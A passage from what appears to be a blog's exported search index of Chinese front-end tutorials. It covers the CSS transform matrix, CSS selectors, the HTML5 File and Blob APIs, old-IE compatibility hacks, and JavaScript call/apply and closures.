0 1transform: matrix(1, 0, 0, 1, e, f); 那么大家想想一下，我们把 a 的值从 1 变为 2 会发生什么？如果把 a 的值从 1 变为 2 那么矩阵如下： 也就是说，基向量 i 的坐标从 (1, 0) 变成了 (2, 0)，这是在干什么？是不是基向量 i 被放大为了原来的二倍？举一个通俗的例子：原本单位长度1代表20px，被放大后单位长度1则代表40px。同样的，当我们把 a 的值从 1 变为 0.5 则意味着把基向量 i 缩小为原来的一半。事实上：在 transform: matrix() 中，修改 a 的值，就是在改变 x 轴方向的缩放比例： 123transform: matrix(2, 0, 0, 1, 0, 0);/* 等价于 */transform: scaleX(2); 相信大家已经知道了，修改 d 的值，就是改变 y 轴的缩放比例： 123transform: matrix(1, 0, 0, 4, 0, 0);/* 等价于 */transform: scaleY(4); 那么旋转要如何修改 matrix 中的值呢？其实，想要知道如何修改 a b c d 的值，只需要知道，旋转后基向量 i 和 j 的坐标就可以了，将旋转后的坐标对号填入就可以得到变换矩阵，下面，我们就来看看如何确定旋转后基向量 i 和 j 的坐标。 我们知道，在 web 开发中的坐标系和数学中的坐标系在正方向的选取上不太一致，在大家所熟悉的坐标系中，正方向的选取如下： 而在 web 开发中，坐标系的正方向选取是这样的： 假设我们将其顺时针旋转 45 度，如下图： 假设，上图中我们旋转的是单位向量，那么旋转后单位向量 i 的坐标应该是 (cosθ, sinθ)，单位向量 j 的坐标应该是 (-sinθ, cosθ)，所以如果用矩阵表示的话，应该是这样的： 如果写到 matrix 里，自然就是下面这个样子： 1transform: matrix(cosθ, sinθ, -sinθ, cosθ, 0, 0) 所以，如果我们要顺时针旋转 45 度，下面两种写法是等价的： 12345678/* * Math.cos(Math.PI / 180 * 45) = 0.707106 * Math.sin(Math.PI / 180 * 45) = 0.707106 */transform: matrix(0.707106, 0.707106, -0.707106, 0.707106, 0, 0)/* 等价于 */transform: rotate(45deg); 通过上面缩放和旋转的例子，我们已经知道了，2 x 2 的矩阵确实能够描述二维空间的变换，这也就是矩阵能够操作空间的原因。在 transform 中，除了缩放(scale)、旋转(rotate) 还有倾斜(skew)，对于倾斜，类似于我们寻找旋转后基向量的坐标一样，你只需要根据倾斜所定义的变换规则，找到基向量变换后的坐标就可以了，实际上倾斜对应如下规则： 1transform: matrix(1, tan(θy), tan(θx), 1, 0, 0); 大家自己拿只笔在纸上画一画应该就能搞清楚倾斜在做什么样子的变换。 无论 缩放(scale)、旋转(rotate) 还是倾斜(skew)，他们都不会是原点发生改变，所以使用 a b c d 四个数字组成的矩阵完全可以描述，但是不要忘了，我们还有一个 位移(translate)，这时，就不得不提到 e f 了，我想我不说大家也都知道了，e f 分别代表了 x y 方向的位移，事实也如大家所想： 1234transform: matrix(1, 0, 0, 1, 100, 200)/* 等价于 */transform: translateX(100px) translateY(200px); 至此，transform 使用 3 x 3 矩阵： 来描述二维空间变换的方式，以及是如何做到的我们就算讲完了。 除了2D变换，还有3D变换，在 transform 中，使用 4 x 4 的矩阵描述3D变换，但实际上，三维空间的线性变换只需要一个 3 x 3 的矩阵就可以描述了，那么为什么搞了一个 4 x 4矩阵呢？实际上这和我们在将二维空间的变换使用 3 x 3 矩阵的道理是一样的，那就是位移。 我们来看一下3D变换的 matrix 默认值： 12transform: matrix(a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p);transform: matrix(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); 这十六个数字就是 4 x 4 矩阵的 16 个数值： 如果换成对应数字，是这样的： 类似于我们讲解 2D 变换一样，其中由 组成的 3 x 3 矩阵用来描述空间的 3D 线性变换，如：rotateX rotateY scaleZ 等等，注意：rotateZ 是 2D 变换哦。 而 m n o 则分别用来描述位移：translateX translateY translateZ。]]></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>API</tag>
        <tag>transform</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3-transform属性详解]]></title>
    <url>%2F2018%2F04%2F17%2FCSS3_transform%E5%B1%9E%E6%80%A7%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[transform 2D旋转 单位：度数单位，常用角度(deg) 示例：1transform: rotate(20deg); 斜切 单位：度数单位，常用角度(deg) 示例：123transform: skew(20deg, 40deg);transform: skewX(20deg);transform: skewY(20deg); 缩放 单位：倍数，无需指定单位 示例：123transform: scale(2, 1);transform: scaleX(2);transform: scaleY(2); 位移 单位：长度单位，常用(px) 示例：123transform: translate(100px, 100px);transform: translateX(100px);transform: translateY(100px); transform-origin 描述：设置变换基点 示例：1transform-origin: 关键字/百分比/距离单位; 坑点：通过js的方式来设置变换基点（dom.style.WebkitTransformOrigin = ‘0 0’;），不能快速同步给变换，在css中没问题 执行顺序先写后执行，应该说 先写的变换 会影响 后边的变换 矩阵 matrix(a, b, c, d, e, f) 默认值：matrix(1, 0, 0, 1, 0, 0) rotate / skew / scale / translate 等变换都是通过矩阵实现的，只不过是浏览器给我们封装好的函数 计算方法 1234567891011121314151617181920212223x 轴位移： e = e + xy 轴位移： f = f + yx 轴斜切： c = Math.tan(Math.PI / 180 * x)y 轴斜切： b = Math.tan(Math.PI / 180 * y)x 轴缩放： a = a * x c = c * x e = e * xy 轴缩放： b = b * y c = c * y f = f * y旋转 a = Math.cos(Math.PI / 180 * deg) b = Math.sin(Math.PI / 180 * deg) c = -Math.sin(Math.PI / 180 * deg) d = Math.cos(Math.PI / 180 * deg) transform 3Dperspective 描述：设置景深 单位：无 示例： 1perspective: 200; 注意：该属性要加给需要做3D变换的父级元素 perspective-origin 描述：景深基点，可以理解为视线方向 示例：1perspective-origin: 关键字/距离单位; transform-style 描述：当元素做3D变换时是否保留子元素的3D变换 示例：12transform-style: flat; /* 不保留 */transform-style: preserve-3d; /* 保留 */ backface-visibility 描述：隐藏背面 示例：12backface-visibility: visible; /* 可见 */backface-visibility: hidden; /* 不可见 */ 3D 旋转 单位：度数单位，常用角度(deg) 示例：1234/* 围绕Z轴旋转 */transform: rotateZ();/* XYZ结合写法 */transform: rotate3D(); 3D 位移 单位：长度单位，常用单位(px) 示例：1234/* Z轴位移 */transform: translateZ();/* XYZ结合写法 */transform: translate3D();]]></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>API</tag>
        <tag>transform</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3-选择器整理]]></title>
    <url>%2F2018%2F04%2F17%2FCSS3_CSS3%E9%80%89%E6%8B%A9%E5%99%A8%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[CSS选择器整理基本选择器 选择器 名称 描述 * 通配选择器 选择文档中所有的HTML元素 E 元素选择器 选择指定类型的HTML元素，例如：li、p等等 #id ID 选择器 选择ID属性值为 “id” 的元素 .class 类选择器 选择class属性值为 “class” 的一组元素 selector1, selector2 群组选择器 将每一个选择器匹配的集合合并 层次选择器 选择器 名称 描述 selector1 selector2 后代选择器(包含选择器) 选择selector2所匹配的一组元素，且selector2是selector1的后代元素 selector1 &gt; selector2 子选择器 选择selector2所匹配的一组元素，且selector2是selector1的直接子元素 selector1 + selector2 相邻兄弟选择器 选择selector2所匹配的元素，且selector2位于selector1的后面 selector1 ~ selector2 通用选择器 选择selector2所匹配的一组元素，且该组元素位于selector1后面 伪类选择器动态伪类选择器 选择器 名称 描述 selector:link 连接伪类选择器 选择selector所匹配的元素，且该元素被定义了超链接并未被访问过，常用于a标签 selector:visited 连接伪类选择器 选择selector所匹配的元素，且该元素被定义了超链接并已被访问过，常用于a标签 selector:active 用户行为伪类选择器 选择selector所匹配的元素，且该元素被激活，常用于连接或按钮上 selector:hover 用户行为伪类选择器 选择selector所匹配的元素，且用户鼠标停留在该元素上 selector:focus 用户行为伪类选择器 选择selector所匹配的元素，且该元素获得焦点 目标伪类选择器 选择器 名称 描述 selector:target 目标伪类选择器 选择selector所匹配的元素，且该元素的ID值等于页面URL片段标识符(即#号后面的值)的值 语言伪类选择器 选择器 名称 描述 selector:lang(language) 语言伪类选择器 选择selector所匹配的元素，且该元素指定了值为 language 的 lang 属性，多用于多语言网站不同样式的处理上 UI元素状态伪类选择器 选择器 名称 描述 selector:checked 选中状态伪类选择器 匹配选中的单选按钮/复选按钮 selector:enabled 启用状态伪类选择器 选择selector所匹配的表单元素，其该元素为启用状态 selector:disabled 禁用状态伪类选择器 选择selector所匹配的表单元素，其该元素为禁用状态 结构伪类选择器 选择器 描述 selector:first-child 选择selector所匹配的元素，且该元素是其父元素的第一个子元素(不算文本节点，也不区分元素类型)，等价于 selector:nth-child(1) selector:last-child 选择selector所匹配的元素，且该元素是其父元素的最后一个子元素(不算文本节点，也不区分元素类型)，等价于 selector:nth-last-child(1) selector:nth-child(n) 选择selector所匹配的元素，且该元素是其父元素的第n个子元素(不算文本节点，也不区分元素类型)，其中 n 的值可以使正数(1、2、3…)，也可以是关键字(even、odd)，也可以是公式(2n+1、2n-1…)，且 n 的起始值是1而不是0 selector:nth-last-child(n) 选择selector所匹配的元素，且该元素是其父元素的倒数第n个子元素(不算文本节点，也不区分元素类型) selector:first-of-type 选择selector所匹配的元素，且该元素是其父元素的第一个特定类型的子元素(不算文本节点，区分元素类型) selector:last-of-type 选择selector所匹配的元素，且该元素是其父元素的最后一个特定类型的子元素(不算文本节点，区分元素类型) selector:nth-of-type(n) 选择selector所匹配的元素，且该元素是其父元素的第n个特定类型的子元素(不算文本节点，区分元素类型) selector:nth-last-of-type(n) 选择selector所匹配的元素，且该元素是其父元素的倒数第n个特定类型的子元素(不算文本节点，区分元素类型) selector:only-child 选择selector所匹配的元素，且其父元素只有它一个子元素(不算文本节点，也不区分元素类型) selector:only-of-type 选择selector所匹配的元素，且其父元素只有它一个特定类型的子元素(不算文本节点，区分元素类型) selector:root 选择selector所匹配的元素所在文档的根元素，即html元素 selector:empty 选择selector所匹配的元素，且该元素没有任何子元素(包括文本节点) 否定伪类选择器 选择器 描述 selector1:not(selector2) 选择所有不包含selector2的selector1元素 伪元素 选择器 描述 selector::first-letter 选择文本块的第一个字母 selector::first-line 选择文本块的第一行文本 selector::before 用来为selector所匹配的元素的所有子元素前面插入内容，插入的内容不会成为DOM的一部分，但是依然可以设置样式 selector::after 用来为selector所匹配的元素的所有子元素后面插入内容，插入的内容不会成为DOM的一部分，但是依然可以设置样式 selector::selection 匹配被鼠标选中的文本 双冒号代表伪元素，单冒号代表伪类 属性选择器 选择器 描述 selector[attr] 选择selector所匹配的元素，且该元素拥有attr属性。可以省略selector，表示匹配所有拥有attr属性的元素 selector[attr=val] 选择selector所匹配的元素，且该元素拥有值为val的attr属性。可以省略selector，表示匹配所有拥有值为val的attr属性的元素 selector[attr~=val] 选择selector所匹配的元素，且该元素attr属性值具有多个空格分隔的值，其中一个值等于val。可以省略selector selector[attr*=val] 选择selector所匹配的元素，且该元素attr属性值的任意位置包含val。可以省略selector selector[attr^=val] 选择selector所匹配的元素，且该元素attr属性值以val开头。可以省略selector selector[attr$=val] 选择selector所匹配的元素，且该元素attr属性值以val结尾。可以省略selector 除了上表中介绍的属性选择器之外，还有一个属性选择器没有写在其中，如下： 1234/* 选择selector所匹配的元素，且该元素拥有值以val或val-开头的attr属性，可以省略selector */selector[attr|=val] &#123;&#125; 你可能会问我为什么没有这个选择器写在上面的表格中，是这样的，这个选择器中有字符 |，这个字符在markdown表格中是表格的分界线。日了狗了…..]]></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>API</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3常见属性]]></title>
    <url>%2F2018%2F04%2F17%2FCSS3_CSS3%E5%B8%B8%E8%A7%81%E5%B1%9E%E6%80%A7%2F</url>
    <content type="text"></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>API</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[H5-File和FileList]]></title>
    <url>%2F2018%2F04%2F17%2FH5_File%E5%92%8CFileList%2F</url>
    <content type="text"><![CDATA[File 和 FileList简介File API 顾名思义，是与文件相关的API，它提供了文件信息，并允许JavaScript访问文件的内容。 File API 继承了 Blob，如下证明： 12// Chrome 中File.__proto__ // Blob File 对象出现在哪里FileList通过 &lt;input type=&quot;file&quot; /&gt; 元素选择文件时的 FileList 对象访问，FileList 对象中的每个元素都是一个 File 对象实例。 12345678&lt;input type="file" id="fileinput" /&gt;&lt;script&gt;var input = document.querySelector('#fileinput')input.addEventListener('change', function () &#123; this.files[0] // 这就是一个 File 对象实例&#125;, false)&lt;/script&gt; DataTransfer拖放事件对象的 dataTransfer.files 属性中的每一个元素都是 FIle 对象实例。 File 构造函数File 是一个构造函数，使用方式如下： 1new Blob(bits, name[, options]) 参数： {array} bits bits是一个数组，可以包含 ArrayBuffer、ArrayBufferView、Blob 或者 DOMString。 {string} name 文件的名字或者路径 {object} options 用来设置文件属性的选项，有两个值可以设置：type 和 lastModified {string} type 内容的 MIME type。 {number} lastModified 最后的修改时间，毫秒数。 示例：123456// 验证 File 继承 Blobvar file = new File(["foo"], "foo.txt", &#123; type: "text/plain",&#125;);file instanceof Blob // true File 对象的属性File 继承了 Blob，所以 File 示例对象的属性中包含继承自 Blob 的属性，比如：size 和 type。 lastModified {Number} lastModified 文件的最后修改时间，毫秒数 lastModified {Date} lastModifiedDate 文件的最后修改日期 name {string} name 文件的名称 size {number} size 文件的尺寸 type {string} type 文件的 MIME type webkitRelativePath {string} webkitRelativePath 文件的相对路径 File 对象的方法File 实例有三个方法，不过都不是标准的(Non-standard)，且已经不推荐使用了。推荐使用 FileReader 实例对象的对用方法替代： getAsBinary()使用 FileReader 对象的 readAsBinaryString() 代替 getAsDataURL()使用 FileReader 对象的 readAsDataURL() 代替 getAsText()使用 FileReader 对象的 readAsText() 代替 FileListFileList 对象是一个类数组对象，拥有 length 属性，对象的每个元素都是一个 File 对象实例，比如： 123456789&lt;input type="file" id="fileinput" /&gt;&lt;script&gt;var input = document.querySelector('#fileinput')input.addEventListener('change', function () &#123; this.files // 这就是一个 FileList 对象实例 this.files[0] // 这就是一个 File 对象实例&#125;, false)&lt;/script&gt; 其中 this.files 就是一个 FileList 对象实例，可以想数组一样访问其元素 this.files[0]，代表一个 File 对象实例。 也可以通过 this.files.item(0) 来访问其元素。]]></content>
      <categories>
        <category>H5</category>
      </categories>
      <tags>
        <tag>H5</tag>
        <tag>File</tag>
        <tag>FileList</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[H5-Blob（binary_large_object）]]></title>
    <url>%2F2018%2F04%2F17%2FH5_Blob%EF%BC%88binary-large-object%EF%BC%89%2F</url>
    <content type="text"><![CDATA[blob简介Blob的全称为 binary large object 即 二进制大对象，它是计算机界的通用术语，主要是用来存放和操作二进制数据的。在 javascript 中，我们可以通过 Blob 构造函数，创建一个 Blob 对象。Blob 是很底层的API，File API就是基于 Blob 的。Blob 是一个很有用的东东，正是因为有了 Blob 我们才可以分割文件进行分段上传，才可以 创建Blob网址。 浏览器兼容性如下(截止到2017-08-02)： 可以点击这里查看最新的浏览器兼容情况 Blob 构造函数Blob是一个构造函数，使用方式如下： 1new Blob([array[, options]]) 两个参数都是可选的： array 参数是一个数组，数组的元素可以是 ArrayBuffer, ArrayBufferView, Blob, DOMString 这些对象。 options 参数是一个对象，用来对 Blob 进行设置，其中有两个选项可写： type 默认值是空字符串，相当于 MIME type，指定 Blob 的类型 endings 它指定如何写出包含行结束字符\ n的字符串，默认值是 transparent，这意味着结尾存储在blob中，不会改变。也可指定 native，根据操作系统的文件系统的约定而改变。 Blob 对象的属性size {Number} size Blob对象包含数据的尺寸，字节数 示例： 12let b = new Blob(['I love you'])b.size // 10 type {String} type 返回一个 MIME type 字符串，代表 Blob 中数据的类型 Blob 对象的方法slice([start [, end [, contentType]]]) 描述：从已有的 Blob 对象创建一个新的 Blob 对象 参数： {start} number 起始位置，如果传递负数则倒数，如果传递的数值大于原 Blob 对象的尺寸则返回一个空 Blob 对象，默认值是 0。 {end} number 结束位置，不包含该位置，如果传递负数则倒数，默认值是等于 size 属性的值，即结束位置。 {contentType} 指定新 Blob 对象的 MIME type，默认值为空字符串 返回值： {Blob} 新的 Blob 对象 应用预览 PDF 文件 1234567891011121314151617&lt;body&gt; &lt;input type="file" id="fileinput" /&gt; &lt;iframe style="width: 700px; height: 400px;" id="viewer"&gt;&lt;/iframe&gt; &lt;script&gt; var input = document.querySelector('#fileinput') input.addEventListener('change', function () &#123; // 其中 this.files[0] 为 File 的实例，但 File 继承 Blob var obj_url = window.URL.createObjectURL(this.files[0]) var iframe = document.querySelector('viewer') iframe.setAttribute('src', obj_url) iframe.onload = function () &#123; window.URL.revokeObjectURL(obj_url) &#125; &#125;, false) &lt;/script&gt;&lt;/body&gt; 效果如下： 注意： 以上代码在火狐(53.0.3)中可以在本地环境运行，在Chrome(59.0.3071.115)和Safari中必须要在服务器环境下，才能正常运行。 值得关注的是，除此应用之外，由于 File API继承且基于 Blob，所以对于 File 的应用，也算是对 Blob 的应用。]]></content>
      <categories>
        <category>H5</category>
      </categories>
      <tags>
        <tag>H5</tag>
        <tag>Blob</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[H5常见的API]]></title>
    <url>%2F2018%2F04%2F17%2FH5_H5%E5%B8%B8%E8%A7%81%E7%9A%84API%2F</url>
    <content type="text"></content>
      <categories>
        <category>H5</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>H5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[H5常用的新标签]]></title>
    <url>%2F2018%2F04%2F17%2FH5_H5%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B0%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"></content>
      <categories>
        <category>H5</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>H5</tag>
        <tag>新标签</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[link和@import的区别]]></title>
    <url>%2F2018%2F04%2F17%2FCSS_link%E5%92%8C-import%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>引入方式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[各种居中实现大全]]></title>
    <url>%2F2018%2F04%2F17%2FCSS_%E5%90%84%E7%A7%8D%E5%B1%85%E4%B8%AD%E5%AE%9E%E7%8E%B0%E5%A4%A7%E5%85%A8%2F</url>
    <content type="text"></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>实例</tag>
        <tag>居中</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端字体大小设置实战]]></title>
    <url>%2F2018%2F04%2F17%2FCSS3_%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%E8%AE%BE%E7%BD%AE%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>移动端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css长度单位集锦]]></title>
    <url>%2F2018%2F04%2F17%2FCSS_css%E9%95%BF%E5%BA%A6%E5%8D%95%E4%BD%8D%E9%9B%86%E9%94%A6%2F</url>
    <content type="text"></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>单位</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何清除浮动]]></title>
    <url>%2F2018%2F04%2F17%2FCSS_%E5%A6%82%E4%BD%95%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8%2F</url>
    <content type="text"></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>清浮动</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS-css hack兼容性]]></title>
    <url>%2F2018%2F04%2F17%2FCSS_css-hack%E5%85%BC%E5%AE%B9%E6%80%A7%2F</url>
    <content type="text"><![CDATA[一、IE6/7/8 不支持HTML5标签12345678解决方案一： 可以使用 document.createElement() 动态创建HTML5标签，如 header footer 等，但是在 IE6/7/8 看来，这种方法创建的标签属于自定义标签，自定义标签默认为内联元素，所以为了将一些元素转为块元素，还需加上如下js代码 header&#123; display: block; &#125;解决方案二： 使用一套成熟的js库，github地址：https://github.com/aFarkas/html5shiv 二、IE6/7 不支持 BFC这导致 在标准浏览器中原本能够触发BFC的属性，不能在IE6/7中正常触发。会有很多奇怪的问题，比如两个float的元素的内容会互相影响 等等。 不过IE有自己的一个东西，叫做 haslayout ， 但以上描述的问题在IE6/7中基本可以靠 触发IE的haslayout解决，如：zoom:1 三、IE6下，如果子元素的宽高超过父级元素的宽高，父级元素被子元素撑开。不过，一般不会有人这么写，更不建议这么写 四、IE6不支持 display: inline-block;12345解决方法： &#123; *display: inline; zoom: 1; &#125; 五、IE6下div最小高度 19px1234解决办法： &#123; overflow: hidden; &#125; 六、IE6下块儿元素浮动会产生双倍 margin 值12解决办法： 将块儿元素转为行内元素，即添加 display: inline; 七、li下元素都浮动，那么在IE6/7下，每个li元素间会有4px的间隔12解决方案： 给 li 元素添加 vertical-align: top; 八、IE6文字溢出bug，两个浮动元素中间有内敛元素或者注释节点，且其中一个浮动元素的宽度和父级宽度相差小于3px。那么这个浮动元素内的文本会被复制出一个“小尾巴”九、IE6/7 下，父级的 overflow: hidden; 包不住拥有相对定位(position: relative;) 的子元素12解决方案： 给父级也加相对定位 position: relative; 十、在IE6下绝对定位元素父级的宽高是奇数时，绝对定位元素的right和bottom值会有1px的偏差。1解决办法：避免绝对定位元素的父级宽高是奇数 十一、在IE6下，绝对定位元素和浮动元素并列，绝对定位元素消失1解决办法：不让其同级就可以了 十二、IE6下input表单元素上下各有1px的间隙。1解决办法，给input元素加浮动 十三、IE6输入类型的表单背景图随着用户输入而移动的bug1解决办法：在设置background属性时加 fixed：(background: url(img/a.jpg) no-repeat fixed;) 十四、IE8不会重绘伪类元素，除非修改伪类元素的 content 值1解决办法：定义新样式，修改伪类元素content的值。 十五、IE9 不支持 dataset1解决办法：使用 getAttribute/setAttribute/removeAttribute/hasAttribute 代替 十六、IE8及以下版本不支持 pageX/Y1解决办法：可以通过 clientX/Y + scrollLeft/Top 计算 十七、IE8及以下不支持 metaKey1234event.shiftKey // 按住 shift 键为trueevent.ctrlKey // 按住 Ctrl 键为trueevent.altKey // 按住 alt 键为trueevent.metaKey // Mac下按住 command 键为true，windows 按住 Windows 键为true 十八、IE8及以下不支持 DOMcontentLoaded1解决办法：使用 window.onload 代替 十九、部分 Android 手机中，键盘事件获取 event.keyCode 异常1使用 textInput 事件，根据按键内容区分按键]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html全局属性（global_attribute）]]></title>
    <url>%2F2018%2F04%2F17%2FHTML_html%E5%85%A8%E5%B1%80%E5%B1%9E%E6%80%A7%EF%BC%88global_attribute%EF%BC%89%20%2F</url>
    <content type="text"></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>HTML</tag>
        <tag>全局属性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[综合-函数式编程]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BB%BC%E5%90%88_%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[一：理解call和apply 及arguments.calleeECMAScript3给Function的原型定义了两个方法，他们是Function.prototype.call 和 Function.prototype.apply. 其实他们的作用是一样的，只是传递的参数不一样而已； apply; 接受2个参数，第一个参数指定了函数体内this对象的指向，第二个参数为一个类似数组的集合，比如如下代码： 123456789var yunxi = function(a,b)&#123; console.log([a,b]); // [1,2] console.log(this === window); // true&#125;;yunxi.apply(null,[1,2]); 如上代码，我们第一个参数传入null，函数体内默认会指向与宿主对象，即window对象；因此我们可以在yunxi函数内打印下值为true即可看到： 下面我们来看看使用call方法的实例如下： 123456789var yunxi = function(a,b)&#123; console.log([a,b]); // [1,2] console.log(this === window); // true&#125;;yunxi.call(null,1,2); 可以看到 call方法的第二个参数是以逗号隔开的参数； 那么call和apply用在什么地方呢？ call和apply 最常见的用途是改变函数体内的this指向，如下代码: 12345678910111213var longen = &#123; name:'yunxi'&#125;;var longen2 = &#123; name: '我叫涂根华'&#125;;var name = "我是来测试的";var getName = function()&#123; return this.name;&#125;;console.log(getName()); // 打印 "我是来测试的";console.log(getName.call(longen)); // 打印 yunxiconsole.log(getName.call(longen2)); // 打印 "我叫涂根华" 第一次调用 getName()方法，因为它是普通函数调用，所以它的this指向与window，因此打印出全局对象的name的值； 第二次调用getName.call(longen); 执行这句代码后，getName这个方法的内部指针this指向于longen这个对象了，因此打印this.name实际上是longen.name，因此返回的是name=”yunxi”; 但是this指针也有列外的情况，比如一个点击元素，当我们点击一个元素的时候，this指针就指向与那个点击元素，但是当我们在内部再包含一个函数后，在函数内再继续调用this的话，那么现在的this指针就指向了window了；比如如下代码： 1234567document.getElementById("longen").onclick = function()&#123; console.log(this); // this 就指向于div元素对象了 var func = function()&#123; console.log(this); // 打印出window对象 &#125; func();&#125; 如上代码。可以看到外部this指向与被点击的那个元素，内部普通函数调用，this指针都是指向于window对象。但是我们可以使用call或者apply方法来改变this的指针的；如下代码： 1234567document.getElementById("longen").onclick = function()&#123; console.log(this); // this 就指向于div元素对象了 var func = function()&#123; console.log(this); // 就指向于div元素对象了 &#125; func.call(this);&#125; 如上代码我们使用call方法调用func函数，使this指向与func这个对象了，当然上面的方法我们还可以不使用call或者apply方法来改变this的指针，我们可以在外部先使用一个变量来保存this的指针，在内部调用的时候我们可以使用哪个变量即可，如下代码演示： 12345678document.getElementById("longen").onclick = function()&#123; console.log(this); // this 就指向于div元素对象了 var self = this; var func = function()&#123; console.log(self); // 就指向于div元素对象了 &#125; func();&#125; arguments.callee的理解callee是arguments的一个属性，它可以被用作当前函数或函数体执行的环境中，或者说调用一个匿名函数；返回的是当前正在被执行的Function对象；简单的来说就是当前执行环境的函数被调用时候，arguments.callee对象会指向与自身，就是当前的那个函数的引用； 如下代码： 12345678910var count = 1;var test = function() &#123; console.log(count + " -- " + (test.length == arguments.callee.length) ); // 打印出 1 -- true 2 -- true 3 -- true if (count++ &lt; 3) &#123; // 调用test()函数自身 arguments.callee(); &#125;&#125;;test(); arguments.callee()的含义是调用当前正在执行的函数自身，比如上面的test的匿名函数； Function.prototype.bind介绍目前很多高级浏览器都支持Function.prototype.bind方法，该方法用来指定函数内部的this指向。为了支持各个浏览器，我们也可以自己来简单的模拟一个~ 如下代码： 123456789101112131415Function.prototype.bind = function(context) &#123; var self = this; return function()&#123; return self.apply(context,arguments); &#125;&#125;var yunxi = &#123; name: 'yunxi'&#125;;var func = function()&#123; console.log(this.name); // yunxi&#125;.bind(yunxi);func(); 如上代码所示：func这个函数使用调用bind这个方法，并且把对象yunxi作为参数传进去，然后bind函数使用return返回一个函数，当我们调用func()执行这个方法的时候，其实我们就是在调用bind方法内的return返回的那个函数，在返回的那个函数内context的上下文其实就是我们以参数yunxi对象传进去的，因此this指针指向与yunxi这个对象了~ 所以打印出this.name 就是yunxi那个对象的name了; 除了上面我们看到的介绍apply或者call方法可以改变this指针外，我们还可以使用call或者apply来继承对象的方法；实质也就是改变this的指针了； 比如有如下代码： 1234567891011121314var Yunxi = function(name)&#123; this.name = name;&#125;;var Longen = function()&#123; Yunxi.apply(this,arguments);&#125;;Longen.prototype.getName = function()&#123; return this.name;&#125;;var longen = new Longen("tugenhua");console.log(longen.getName()); // 打印出tugenhua 如上代码：我先实例化Longen这个对象，把参数传进去，之后使用Yunxi.apply(this,arguments)这句代码来改变Longen这个对象的this的指针，使他指向了Yunxi这个对象，因此Yunxi这个对象保存了longen这个实例化对象的参数tugenhua，因此当我们调用longen.getName这个方法的时候，我们返回this.name，即我们可以认为返回的是 Yunxi.name 因此返回的是 tugenhua，我们只是借用了下Yunxi这个对象内的this.name来保存Longen传进去的参数而已； 二：闭包的理解闭包的结构有如下2个特性 封闭性：外界无法访问闭包内部的数据，如果在闭包内声明变量，外界是无法访问的，除非闭包主动向外界提供访问接口； 持久性：一般的函数，调用完毕之后，系统自动注销函数，而对于闭包来说，在外部函数被调用之后，闭包结构依然保存在 系统中，闭包中的数据依然存在，从而实现对数据的持久使用。 缺点： 使用闭包会占有内存资源，过多的使用闭包会导致内存溢出等. 如下代码： 123456789function a(x) &#123; var a = x; var b = function()&#123; return a; &#125; return b;&#125;var b = a(1);console.log(b()); // 1 首先在a函数内定义了2个变量，1个是存储参数，另外一个是闭包结构，在闭包结构中保存着b函数内的a变量，默认情况下，当a函数调用完之后a变量会自动销毁的，但是由于闭包的影响，闭包中使用了外界的变量，因此a变量会一直保存在内存当中，因此变量a参数没有随着a函数销毁而被释放，因此引申出闭包的缺点是：过多的使用闭包会占有内存资源，或内存溢出等肯能性； 1234567891011// 经典的闭包实列如下：function f(x)&#123; //外部函数 var a = x; // 外部函数的局部变量，并传递参数 var b = function()&#123; // 内部函数 return a; // 访问外部函数中的局部变量 &#125;; a++; // 访问后，动态更新外部函数的变量 return b; // 返回内部函数&#125;var c = f(5); // 调用外部函数并且赋值console.log(c()); // 调用内部函数，返回外部函数更新后的值为6 下面我们来看看如下使用闭包的列子 